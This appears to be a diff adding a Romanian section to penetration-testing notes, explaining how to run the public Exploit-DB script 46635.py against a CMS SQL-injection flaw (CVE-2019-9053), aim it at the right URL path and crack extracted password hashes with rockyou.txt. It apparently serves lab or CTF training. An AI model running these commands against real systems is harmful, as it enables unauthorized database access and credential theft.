@@ -456,6 +456,34 @@ Când identifici servicii învechite sau versiuni specifice de software în faza
   ```
   *Sincronizează baza locală cu cele mai noi exploit-uri apărute pe Exploit-DB.*
 
+---
 
+### 🚀 Executarea Exploit-urilor Python (`.py`) descărcate
+
+După ce ai identificat și copiat un exploit local (cum este celebrul `46635.py` pentru vulnerabilitatea SQLi CVE-2019-9053), trebuie să îl configurezi și să îl rulezi indicând calea corectă din server.
+
+#### 1. Identificarea versiunii corecte de Python
+Multe exploit-uri din Exploit-DB sunt scrise în versiuni mai vechi. Dacă primești eroarea `SyntaxError: Missing parentheses in call to 'print'`, scriptul necesită **Python 2**.
+
+#### 2. Sintaxa corectă de rulare (Specificarea URL-ului complet)
+Dacă rulezi exploit-ul doar pe adresa IP de bază, acesta poate raporta că a găsit vulnerabilitatea, dar va lăsa câmpurile goale (`username found: [gol]`). Este obligatoriu să îi pasezi directorul sau pagina exactă unde rulează aplicația web vulnerabilă:
+
+```bash
+python2 46635.py -u http://<IP_TINTA>/pagina
+```
+
+*Dacă aplicația se află într-un subdirector specificat în faza de enumerare (ex: Gobuster), comanda va arăta astfel:*
+```bash
+python2 46635.py -u http://10.10.10.X/simple/
+```
+
+#### 3. Automatizarea spargerii parolei direct din exploit
+Multe scripturi complexe de SQLi (inclusiv `46635.py`) acceptă parametri suplimentari pentru a trimite hash-ul extras direct către un wordlist local, salvând timp:
+
+```bash
+python2 46635.py -u http://<IP_TINTA>/simple/ --crack -w /usr/share/wordlists/rockyou.txt
+```
+*   `--crack`: Indică scriptului să încerce decriptarea hash-ului imediat ce este extras din baza de date.
+*   `-w`: Specifică calea către dicționarul de parole (`rockyou.txt`).
 
 
